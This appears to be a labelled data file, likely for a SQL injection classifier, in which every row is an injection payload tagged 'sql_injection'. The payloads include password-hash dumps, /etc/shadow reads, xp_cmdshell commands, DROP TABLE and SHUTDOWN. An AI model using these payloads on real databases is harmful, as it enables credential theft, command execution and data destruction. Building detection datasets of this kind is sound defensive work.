"' OR JSON_EXTRACT('[1,1]','$[0]')=1 --","sql_injection"
"' OR JSON_EXTRACT('{\"a\":1}','$.a')=1 --","sql_injection"
"' OR CAST(version() AS CHAR) LIKE '%' --","sql_injection"
"' OR CONCAT('A','A')='AA' --","sql_injection"
"' OR LENGTH((SELECT database()))>1 --","sql_injection"
"' OR EXISTS(SELECT * FROM information_schema.columns) --","sql_injection"
"' AND (SELECT COUNT(*) FROM mysql.user)>0 --","sql_injection"
"' AND LENGTH(user())>0 --","sql_injection"
"' AND LENGTH((SELECT @@version))>1 --","sql_injection"
"' OR (SELECT LENGTH(database()))>1 --","sql_injection"
"' OR (SELECT LENGTH(user()))>1 --","sql_injection"
"' OR (SELECT LENGTH(@@version))>1 --","sql_injection"
"' OR (SELECT 1 FROM users WHERE username='admin')=1 --","sql_injection"
"' OR (SELECT SUBSTRING(@@version,1,1))='5' --","sql_injection"
"' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u' --","sql_injection"
"' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0 --","sql_injection"
"' AND LENGTH((SELECT group_concat(table_name) FROM information_schema.tables))>1 --","sql_injection"
"' AND IF((SELECT LENGTH(user()))>0,1,0) --","sql_injection"
"' OR IF((SELECT 'a'='a'),1,0) --","sql_injection"
"' OR IF((SELECT 1 FROM users LIMIT 1)=1,SLEEP(3),0) --","sql_injection"
"' AND IF((SELECT database()) LIKE '%',1,0) --","sql_injection"
"' OR CASE WHEN 1=1 THEN SLEEP(2) ELSE 0 END --","sql_injection"
"' OR 1 REGEXP '.*' --","sql_injection"
"' OR 'x' LIKE 'x%' --","sql_injection"
"' OR (SELECT 'a' FROM dual)='a' --","sql_injection"
"' OR 1 BETWEEN 1 AND 2 --","sql_injection"
"' OR 1 LIKE 1 --","sql_injection"
"' OR TRUE IS TRUE --","sql_injection"
"' OR FALSE != TRUE --","sql_injection"
"' OR NOT(FALSE) --","sql_injection"
"' OR 1<<1=2 --","sql_injection"
"' OR 2>>1=1 --","sql_injection"
"' OR 3&1=1 --","sql_injection"
"' OR 3|1=3 --","sql_injection"
"' OR (SELECT 1 FROM dual LIMIT 1)=1 --","sql_injection"
"' OR MOD(4,2)=0 --","sql_injection"
"' OR POW(2,2)=4 --","sql_injection"
"' OR RAND()=RAND() --","sql_injection"
"' OR EXP(2)=7.389056 --","sql_injection"
"' OR SQRT(4)=2 --","sql_injection"
"' OR CEIL(1.1)=2 --","sql_injection"
"' OR FLOOR(1.9)=1 --","sql_injection"
"' OR LENGTH('abc')=3 --","sql_injection"
"' OR CHAR_LENGTH('admin')=5 --","sql_injection"
"' OR LOCATE('a','admin')=1 --","sql_injection"
"' OR INSTR('hello','e')=2 --","sql_injection"
"' OR FIND_IN_SET('root','root,user')>0 --","sql_injection"
"' OR 'a' IN ('a','b','c') --","sql_injection"
"' OR 1 IN (SELECT 1 FROM dual) --","sql_injection"
"' OR 'admin'=(SELECT username FROM users LIMIT 1) --","sql_injection"
"' OR (SELECT COUNT(*) FROM information_schema.tables)>0 --","sql_injection"
"' OR (SELECT table_name FROM information_schema.tables LIMIT 1) LIKE '%' --","sql_injection"
"' OR COALESCE(NULL,1)=1 --","sql_injection"
"' OR NULLIF(1,2)=1 --","sql_injection"
"' OR GREATEST(1,2)=2 --","sql_injection"
"' OR LEAST(1,2)=1 --","sql_injection"
"' OR BIT_COUNT(7)=3 --","sql_injection"
"' AND (SELECT 1337)=1337 --","sql_injection"
"' AND (SELECT UPPER('a'))='A' --","sql_injection"
"' AND (SELECT LOWER('A'))='a' --","sql_injection"
"' OR CAST(1 AS SIGNED)=1 --","sql_injection"
"' OR CAST('a' AS CHAR)='a' --","sql_injection"
"' OR TRUE/*test*/","sql_injection"
"' OR FALSE/*test*/","sql_injection"
"' OR 1=1--random","sql_injection"
"' OR 1=1--/**/","sql_injection"
"' OR/**/1/**/=/**/1 --","sql_injection"
"'||(SELECT 1)||'","sql_injection"
"' || '1'='1","sql_injection"
"admin'||'1'='1","sql_injection"
"' OR 1=1 USING UTF8 --","sql_injection"
"' OR 1=1 COLLATE utf8_general_ci --","sql_injection"
"' OR 1=1 COLLATE latin1_swedish_ci --","sql_injection"
"' UNION SELECT hex(version()) --","sql_injection"
"' UNION SELECT unhex('2f6574632f706173737764') --","sql_injection"
"' UNION SELECT TO_BASE64(load_file('/etc/passwd')) --","sql_injection"
"' UNION SELECT FROM_BASE64('cm9vdDo6MA==') --","sql_injection"
"' UNION SELECT MD5('test') --","sql_injection"
"' UNION SELECT SHA1('test') --","sql_injection"
"' UNION SELECT SHA2('test',256) --","sql_injection"
"' AND MD5('a')='0cc175b9c0f1b6a831c399e269772661' --","sql_injection"
"' AND SHA1('a')='86f7e437faa5a7fce15d1ddcb9eaeaea377667b8' --","sql_injection"
"' OR ASCII('A') BETWEEN 65 AND 90 --","sql_injection"
"' OR ASCII('a') BETWEEN 97 AND 122 --","sql_injection"
"' OR ASCII(SUBSTRING((SELECT user()),1,1))>50 --","sql_injection"
"' OR (SELECT LENGTH(user()))>3 --","sql_injection"
"' OR LEFT(user(),1)='r' --","sql_injection"
"' OR RIGHT(database(),1)='m' --","sql_injection"
"' OR SUBSTRING(database(),1,3)='adm' --","sql_injection"
"' OR MID(database(),1,3)='tes' --","sql_injection"
"' OR OCTET_LENGTH(database())>3 --","sql_injection"
"' OR QUOTE(user()) LIKE '%@%' --","sql_injection"
"' OR (SELECT user()) REGEXP 'root' --","sql_injection"
"' OR 'abc' REGEXP 'a.*' --","sql_injection"
"' OR (SELECT schema_name FROM information_schema.schemata LIMIT 1) REGEXP '.*' --","sql_injection"
"' OR (SELECT 1 FROM information_schema.columns LIMIT 1)=1 --","sql_injection"
"' OR EXISTS(SELECT schema_name FROM information_schema.schemata WHERE schema_name LIKE '%') --","sql_injection"
"' AND (SELECT COUNT(*) FROM mysql.user)>0 --","sql_injection"
"' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0 --","sql_injection"
"' AND (SELECT LENGTH(group_concat(table_name)) FROM information_schema.tables)>0 --","sql_injection"
"' OR CASE WHEN (1=1) THEN 1 ELSE 2 END=1 --","sql_injection"
"' OR IFNULL(NULL,1)=1 --","sql_injection"
"' OR NULLIF(1,1) IS NULL --","sql_injection"
"' OR IFNULL((SELECT 1),0)=1 --","sql_injection"
"' OR 1=CAST('1' AS UNSIGNED) --","sql_injection"
"' OR COALESCE(1,2)=1 --","sql_injection"
"' OR 1 LIKE BINARY '1' --","sql_injection"
"' OR STRCMP('a','a')=0 --","sql_injection"
"' OR STRCMP('a','b')!=0 --","sql_injection"
"' OR (SELECT LENGTH(@@version))>1 --","sql_injection"
"' OR (SELECT LENGTH(@@hostname))>1 --","sql_injection"
"' UNION SELECT banner FROM v$version --","sql_injection"
"' UNION SELECT name FROM v$database --","sql_injection"
"' UNION SELECT username FROM all_users --","sql_injection"
"' UNION SELECT table_name FROM all_tables --","sql_injection"
"' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS' --","sql_injection"
"' UNION SELECT password FROM SYS.USER$ --","sql_injection"
"' UNION SELECT * FROM v$pwfile_users --","sql_injection"
"' OR 1=1--oracle","sql_injection"
"' OR 1=1--mssql","sql_injection"
"' OR 1=1--mysql","sql_injection"
"' OR 1=1--postgres","sql_injection"
"' OR 1=1--sqlite","sql_injection"
"' OR (SELECT count(*) FROM pg_user)>0 --","sql_injection"
"' UNION SELECT usename,passwd FROM pg_shadow --","sql_injection"
"' UNION SELECT version(),current_database() --","sql_injection"
"' UNION SELECT tablename FROM pg_tables --","sql_injection"
"' OR EXISTS(SELECT relname FROM pg_class) --","sql_injection"
"' OR (SELECT pg_sleep(3)) --","sql_injection"
"' OR CAST((SELECT version()) AS TEXT) LIKE '%' --","sql_injection"
"' OR EXISTS(SELECT * FROM sqlite_master) --","sql_injection"
"' UNION SELECT sql FROM sqlite_master --","sql_injection"
"' OR (SELECT sqlite_version()) LIKE '%' --","sql_injection"
"' OR instr(sqlite_version(),'3')>0 --","sql_injection"
"' OR (SELECT group_concat(name) FROM sqlite_master)>'' --","sql_injection"
"' OR 1=1 AND RANDOM()>-1 --","sql_injection"
"' OR (SELECT RAISE(IGNORE)) --","sql_injection"
"' --+OR+1=1","sql_injection"
"' OR 1=1;--","sql_injection"
"' OR 1=1;%00","sql_injection"
"' OR TRUE;%00","sql_injection"
"' OR ''=''%00","sql_injection"
"'/**/OR/**/1/**/=/**/1 --","sql_injection"
"' OR 1=1%23","sql_injection"
"' OR SLEEP(3)%23","sql_injection"
"' OR BENCHMARK(1000000,MD5(1))%23","sql_injection"
"' OR IF(1=1,1,0)%23","sql_injection"
"' OR 1=1--+","sql_injection"
"' OR 1=1-- -","sql_injection"
"' OR 1=1/***/","sql_injection"
"' UNION/**/SELECT/**/NULL --","sql_injection"
"' UNION/**/SELECT/**/1,2 --","sql_injection"
"' UNION/**/SELECT/**/table_name FROM information_schema.tables --","sql_injection"
"' OR 1=1 AND 'a'='a --","sql_injection"
"' OR 'a'='a AND 'b'='b --","sql_injection"
"' OR 1=1 AND SLEEP(1) --","sql_injection"
"' OR 1=1 AND BENCHMARK(10000,MD5(1)) --","sql_injection"
"' OR (SELECT COUNT(*) FROM users WHERE username='admin')>0 --","sql_injection"
"' OR (SELECT LENGTH(password) FROM users LIMIT 1)>0 --","sql_injection"
"' OR (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)>'0' --","sql_injection"
"' OR 1=1 AND EXISTS(SELECT 1) --","sql_injection"
"' OR EXISTS(SELECT * FROM users WHERE username LIKE '%') --","sql_injection"
"' OR EXISTS(SELECT * FROM mysql.user WHERE user='root') --","sql_injection"
"' OR (SELECT table_schema FROM information_schema.tables LIMIT 1) LIKE '%' --","sql_injection"
"' OR 1=(SELECT 1 FROM dual) --","sql_injection"
"' OR (SELECT @@GLOBAL.max_connections)>0 --","sql_injection"
"' OR (SELECT @@GLOBAL.hostname) LIKE '%' --","sql_injection"
"' UNION SELECT @@GLOBAL.sql_mode --","sql_injection"
"' UNION SELECT @@GLOBAL.time_zone --","sql_injection"
"' OR 1=1 AND CONNECTION_ID()>0 --","sql_injection"
"' OR (SELECT CONNECTION_ID())>0 --","sql_injection"
"' OR (SELECT SLEEP(1)) --","sql_injection"
"' OR (SELECT SLEEP(2)) --","sql_injection"
"' OR (SELECT SLEEP(3)) --","sql_injection"
"' OR (SELECT SLEEP(0.5)) --","sql_injection"
"' AND IF(1=1,SLEEP(1),0) --","sql_injection"
"' AND IF((SELECT LENGTH(database()))>1,SLEEP(2),0) --","sql_injection"
"' AND IF((SELECT LENGTH(user()))>1,SLEEP(3),0) --","sql_injection"
"' AND IF((SELECT 1 FROM users LIMIT 1)=1,SLEEP(1),0) --","sql_injection"
"' OR CASE WHEN (SELECT 1)=1 THEN SLEEP(2) END --","sql_injection"
"' OR MAKE_SET(1,'a','b')='a' --","sql_injection"
"' OR FIELD('a','a','b','c')=1 --","sql_injection"
"' OR FIND_IN_SET('root','root,user')>0 --","sql_injection"
"' OR JSON_LENGTH('[1,2]')=2 --","sql_injection"
"' OR JSON_CONTAINS('[1,2]','1') --","sql_injection"
"' OR JSON_CONTAINS_PATH('{\"a\":1}','one','$.a') --","sql_injection"
"' OR JSON_EXTRACT('{\"x\":5}','$.x')=5 --","sql_injection"
"' OR JSON_EXTRACT('[\"a\",\"b\"]','$[0]')='a' --","sql_injection"
"' OR JSON_KEYS('{\"a\":1}') LIKE '%' --","sql_injection"
"' OR JSON_DEPTH('[1,2]')>0 --","sql_injection"
"' OR JSON_TYPE('1')='INTEGER' --","sql_injection"
"' OR JSON_VALID('{\"a\":1}')=1 --","sql_injection"
"' OR LENGTH(JSON_ARRAY(1,2,3))>0 --","sql_injection"
"' OR JSON_SEARCH('[\"x\",\"y\"]','one','x') IS NOT NULL --","sql_injection"
"' UNION SELECT JSON_ARRAYAGG(table_name) FROM information_schema.tables --","sql_injection"
"' UNION SELECT JSON_OBJECT('user',user(),'db',database()) --","sql_injection"
"' OR 1=1 AND JSON_EXTRACT('{\"a\":true}','$.a')=true --","sql_injection"
"' OR 1=1 AND JSON_EXTRACT('[10,20]','$[1]')=20 --","sql_injection"
"' OR 1=1 AND JSON_EXTRACT('[\"root\"]','$[0]')='root' --","sql_injection"
"' OR 1=1 AND JSON_EXTRACT('[{\"a\":1}]','$[0].a')=1 --","sql_injection"
"' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL --","sql_injection"
"' UNION SELECT table_schema,table_name,column_name,NULL,NULL,NULL FROM information_schema.columns --","sql_injection"
"' UNION SELECT group_concat(user),group_concat(host) FROM mysql.user --","sql_injection"
"' UNION SELECT schema_name,NULL FROM information_schema.schemata --","sql_injection"
"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='accounts' --","sql_injection"
"' UNION SELECT * FROM information_schema.user_privileges --","sql_injection"
"' OR EXISTS(SELECT * FROM mysql.user WHERE password!='') --","sql_injection"
"' OR EXISTS(SELECT * FROM users WHERE length(password)>0) --","sql_injection"
"' OR EXISTS(SELECT host FROM mysql.user WHERE host='%') --","sql_injection"
"' OR EXISTS(SELECT table_name FROM information_schema.tables WHERE table_schema!='information_schema') --","sql_injection"
"' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name LIKE '%user%') --","sql_injection"
"' OR TRUE AND EXISTS(SELECT version()) --","sql_injection"
"' OR 1=1 AND database() LIKE '%' --","sql_injection"
"' OR database() IN (SELECT schema_name FROM information_schema.schemata) --","sql_injection"
"' OR user() IN (SELECT user FROM mysql.user) --","sql_injection"
"' OR length((SELECT table_name FROM information_schema.tables LIMIT 1))>0 --","sql_injection"
"' AND length((SELECT schema_name FROM information_schema.schemata LIMIT 1))>0 --","sql_injection"
"' AND ascii(substr((SELECT database()),1,1))>0 --","sql_injection"
"' AND ascii(substr((SELECT user()),1,1))>0 --","sql_injection"
"' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>=1 --","sql_injection"
"' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database())>=1 --","sql_injection"
"' OR (SELECT COUNT(*) FROM information_schema.schemata)>=1 --","sql_injection"
"' OR (SELECT LENGTH(CONCAT(user(),database())))>0 --","sql_injection"
"' OR (SELECT LENGTH(GROUP_CONCAT(schema_name)))>0 --","sql_injection"
"' OR (SELECT LENGTH(GROUP_CONCAT(table_name)))>0 --","sql_injection"
"' OR (SELECT LENGTH(GROUP_CONCAT(column_name)))>0 --","sql_injection"
"' OR (SELECT LENGTH(@@version)))>0 --","sql_injection"
"' UNION SELECT NULL,CONCAT(user(),0x3a,database()) --","sql_injection"
"' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database() --","sql_injection"
"' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users' --","sql_injection"
"' UNION SELECT NULL,password FROM users WHERE username='admin' --","sql_injection"
"' UNION SELECT NULL,@@datadir --","sql_injection"
"' UNION SELECT NULL,@@secure_file_priv --","sql_injection"
"' UNION SELECT NULL,@@plugin_dir --","sql_injection"
"' UNION SELECT NULL,@@tmpdir --","sql_injection"
"' UNION SELECT NULL,version() --","sql_injection"
"' UNION SELECT NULL,user() --","sql_injection"
"' UNION SELECT NULL,database() --","sql_injection"
"' UNION SELECT NULL,uuid() --","sql_injection"
"' UNION SELECT NULL,hex(user()) --","sql_injection"
"' UNION SELECT NULL,hex(database()) --","sql_injection"
"' UNION SELECT LOAD_FILE('/etc/passwd'),NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('/etc/shadow'),NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('/etc/hosts'),NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('/proc/version'),NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini'),NULL --","sql_injection"
"' UNION SELECT NULL,LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts') --","sql_injection"
"' OR 1=1; SELECT user,password FROM mysql.user --","sql_injection"
"' OR 1=1; SELECT * FROM users --","sql_injection"
"' OR 1=1; SELECT * FROM accounts --","sql_injection"
"' OR 1=1; SELECT * FROM credit_cards --","sql_injection"
"' OR 1=1; SELECT * FROM secrets --","sql_injection"
"' OR 1=1; SELECT * FROM logs --","sql_injection"
"' OR 1=1; SELECT * FROM admin --","sql_injection"
"' OR 1=1; SELECT * FROM auth --","sql_injection"
"' OR 1=1; SELECT * FROM tokens --","sql_injection"
"' OR 1=1; SELECT * FROM passwords --","sql_injection"
"' OR 1=1; DROP TABLE users --","sql_injection"
"' OR 1=1; DROP TABLE accounts --","sql_injection"
"' OR 1=1; DROP TABLE logs --","sql_injection"
"' OR 1=1; DROP TABLE admin --","sql_injection"
"' OR 1=1; DROP TABLE secrets --","sql_injection"
"' OR 1=1; #","sql_injection"
"' OR 1=1;%00","sql_injection"
"' OR 1=1;%23","sql_injection"
"' OR 1=1;%2D%2D","sql_injection"
"' OR 1=1%20--","sql_injection"
"' OR TRUE%20--","sql_injection"
"' OR ''=''%20--","sql_injection"
"' OR 1/*comment*/=/*comment*/1 --","sql_injection"
"' OR/**/1=1;--","sql_injection"
"'/**/OR/**/1=1/**/--","sql_injection"
"' OR 1=1 UNION/**/SELECT/**/NULL --","sql_injection"
"' OR SLEEP(2)/**/--","sql_injection"
"' OR BENCHMARK(10000,MD5(1))/**/--","sql_injection"
"' OR IF(1=1,1,0)/**/--","sql_injection"
"' OR 1=1; EXEC xp_cmdshell 'whoami' --","sql_injection"
"' OR 1=1; EXEC xp_cmdshell 'dir C:\\' --","sql_injection"
"' OR 1=1; EXEC master..xp_cmdshell 'type C:\\boot.ini' --","sql_injection"
"' OR 1=1; EXEC master..xp_cmdshell 'ipconfig /all' --","sql_injection"
"' OR 1=1; EXEC master..xp_cmdshell 'net user' --","sql_injection"
"' OR 1=1; WAITFOR DELAY '00:00:03' --","sql_injection"
"' OR 1=1; WAITFOR TIME '00:00:10' --","sql_injection"
"' OR 1=1; WAITFOR DELAY '00:00:05'--","sql_injection"
"' OR 1=1; SHUTDOWN WITH NOWAIT --","sql_injection"
"' OR 1=1; SHUTDOWN --","sql_injection"
"' OR 1=1; KILL QUERY 1 --","sql_injection"
"' OR 1=1; KILL CONNECTION 3 --","sql_injection"
"' OR host='localhost' --","sql_injection"
"' OR user() LIKE '%' --","sql_injection"
"' OR database() LIKE '%' --","sql_injection"
"' OR version() LIKE '%' --","sql_injection"
"' OR current_user LIKE '%' --","sql_injection"
"' OR session_user LIKE '%' --","sql_injection"
"' OR system_user LIKE '%' --","sql_injection"
"' OR current_database() LIKE '%' --","sql_injection"
"' OR current_schema() LIKE '%' --","sql_injection"
"' OR EXISTS(SELECT version()) --","sql_injection"
"' OR EXISTS(SELECT current_database()) --","sql_injection"
"' OR EXISTS(SELECT column_name FROM information_schema.columns) --","sql_injection"
"' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '%') --","sql_injection"
"' OR EXISTS(SELECT 1 FROM mysql.user WHERE user LIKE '%') --","sql_injection"
"' OR EXISTS(SELECT 1 FROM pg_user LIMIT 1) --","sql_injection"
"' OR EXISTS(SELECT 1 FROM sqlite_master LIMIT 1) --","sql_injection"
"' OR RANDOM()>0 --","sql_injection"
"' OR RANDOM()=RANDOM() --","sql_injection"
"' OR ABS(-1)=1 --","sql_injection"
"' OR COALESCE(NULL,version()) LIKE '%' --","sql_injection"
"' OR NULLIF(1,2)=1 AND 1=1 --","sql_injection"
"' OR NULLIF(user(),'') IS NOT NULL --","sql_injection"
"' OR 1 BETWEEN 1 AND 2 --","sql_injection"
"' OR 2 BETWEEN 1 AND 3 --","sql_injection"
"' OR 1 IN (1,2,3) --","sql_injection"
"' OR 'admin' IN (SELECT username FROM users) --","sql_injection"
"' OR 'root' IN (SELECT user FROM mysql.user) --","sql_injection"
"' OR EXISTS(SELECT password FROM users) --","sql_injection"
"' OR 1=1 AND LENGTH((SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata))>0 --","sql_injection"
"' OR 1=1 AND LENGTH((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables))>0 --","sql_injection"
"' OR 1=1 AND LENGTH((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns))>0 --","sql_injection"
"' OR (SELECT LENGTH(user()))>1 --","sql_injection"
"' OR (SELECT LENGTH(database()))>1 --","sql_injection"
"' OR (SELECT LENGTH(@@version))>1 --","sql_injection"
"' OR ASCII(SUBSTRING((SELECT database()),1,1))>0 --","sql_injection"
"' OR ASCII(SUBSTRING((SELECT user()),1,1))>0 --","sql_injection"
"' OR convert((SELECT user()) USING utf8) LIKE '%' --","sql_injection"
"' OR CONVERT((SELECT database()) USING utf8) LIKE '%' --","sql_injection"
"' OR CONVERT((SELECT @@version) USING utf8) LIKE '%' --","sql_injection"
"' OR CAST((SELECT database()) AS CHAR) LIKE '%' --","sql_injection"
"' OR CAST((SELECT user()) AS CHAR) LIKE '%' --","sql_injection"
"' OR CAST((SELECT @@version) AS CHAR) LIKE '%' --","sql_injection"
